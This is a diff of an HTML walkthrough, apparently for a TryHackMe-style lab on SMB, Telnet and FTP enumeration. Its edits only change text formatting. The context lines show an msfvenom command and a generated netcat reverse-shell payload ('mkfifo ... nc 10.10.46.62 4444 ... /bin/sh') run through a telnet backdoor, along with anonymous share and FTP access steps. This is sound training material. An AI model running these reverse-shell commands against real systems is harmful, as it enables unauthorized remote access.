@@ -166,7 +166,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?">
 
 <pre tabindex="0"><code>Unix</code></pre>
 <h4 id="enumerating-smb">Enumerating SMB</h4>
-<p>Conduct an <strong>nmap</strong> scan of your choosing, How many ports are open?</p>
+<p>Conduct an <code>nmap</code> scan of your choosing, How many ports are open?</p>
 
 
 
@@ -224,7 +224,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?">
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 13.04 seconds</span></span></code></pre></div>
 <br>
-<p>Let&rsquo;s get started with <strong>Enum4Linux</strong>, conduct a full basic enumeration. For starters, what is the <strong>workgroup</strong> name?</p>
+<p>Let&rsquo;s get started with <code>Enum4Linux</code>, conduct a full basic enumeration. For starters, what is the <code>workgroup</code> name?</p>
 
 
 
@@ -252,7 +252,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?">
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
 <br>
-<p>What comes up as the <strong>name</strong> of the machine?</p>
+<p>What comes up as the <code>name</code> of the machine?</p>
 
 
 
@@ -273,7 +273,7 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?">
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
 <br>
-<p>What operating system <strong>version</strong> is running?</p>
+<p>What operating system <code>version</code> is running?</p>
 
 
 
@@ -334,10 +334,10 @@ SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?">
 
 <pre tabindex="0"><code>smbclient //10.10.10.2/secret -U suit -p 445</code></pre>
 <p>We can remotely access the SMB share using the syntax:
-<strong>smbclient //[IP]/[SHARE]</strong> followed by the tags:
+<code>smbclient //[IP]/[SHARE]</code> followed by the tags:
 -U [name]: to specify the user
 -p [port]: to specify the port
-SMB default ports are <strong>139 or 445</strong></p>
+SMB default ports are <code>139 or 445</code></p>
 <br>
 <p>Let&rsquo;s see if our interesting share has been configured to allow anonymous access, i,e it doesn&rsquo;t require authentication to view the files. We can do this easily by:</p>
 <ul>
@@ -598,7 +598,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|_    SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div>
 <br>
-<p>Who could it belong to? Gathering possible <strong>usernames</strong> is an important step in enumeration.</p>
+<p>Who could it belong to? Gathering possible <code>usernames</code> is an important step in enumeration.</p>
 
 
 
@@ -649,7 +649,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#cba6f7">for</span> full protocol decode
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on ens5, link-type EN10MB <span style="color:#89dceb;font-weight:bold">(</span>Ethernet<span style="color:#89dceb;font-weight:bold">)</span>, capture size <span style="color:#fab387">262144</span> bytes</span></span></code></pre></div>
 <br>
-<p>Now, use the command <strong>Ping [local THM ip] -c 1</strong> through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>
+<p>Now, use the command <code>Ping [local THM ip] -c 1</code> through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>
 
 
 
@@ -683,12 +683,12 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>03:36:25.256083 IP ip-10-10-46-62.eu-west-1.compute.internal &gt; ip-10-10-220-9.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> reply, id 1319, seq 1, length <span style="color:#fab387">64</span></span></span></code></pre></div>
 <br>
 <p>We&rsquo;re going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. here&rsquo;s our syntax:
-<strong>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</strong></p>
+<code>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code></p>
 <ul>
-<li><strong>-p</strong> = payload</li>
-<li><strong>host</strong> = our local host IP address (this is your machine&rsquo;s IP address)</li>
-<li><strong>lport</strong> = the port to listen on (this is the port on your machine)</li>
-<li><strong>R</strong> = export the payload in raw format</li>
+<li><code>-p</code> = payload</li>
+<li><code>host</code> = our local host IP address (this is your machine&rsquo;s IP address)</li>
+<li><code>lport</code> = the port to listen on (this is the port on your machine)</li>
+<li><code>R</code> = export the payload in raw format</li>
 </ul>
 <br>
 <p>What word does the generated payload start with?</p>
@@ -713,7 +713,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>mkfifo /tmp/loqsthl; nc 10.10.46.62 <span style="color:#fab387">4444</span> 0&lt;/tmp/loqsthl | /bin/sh &gt;/tmp/loqsthl 2&gt;&amp;1; rm /tmp/loqsthl</span></span></code></pre></div>
 <br>
 <p>Now all we need to do is start a netcat listener on our local machine. We do this using:
-<strong>nc -lvp [listening port]</strong></p>
+<code>nc -lvp [listening port]</code></p>
 <p>What would the command look like for the listening port we selected in our payload?</p>
 
 
@@ -821,7 +821,7 @@ SMB default ports are <strong>139 or 445</strong></p>
 
 <pre tabindex="0"><code>vsftpd</code></pre>
 <br>
-<p>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing <strong>FTP [IP]</strong> into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted.</p>
+<p>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing <code>FTP [IP]</code> into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted.</p>
 <p>What is the name of the file in the anonymous FTP directory?</p>
 
 
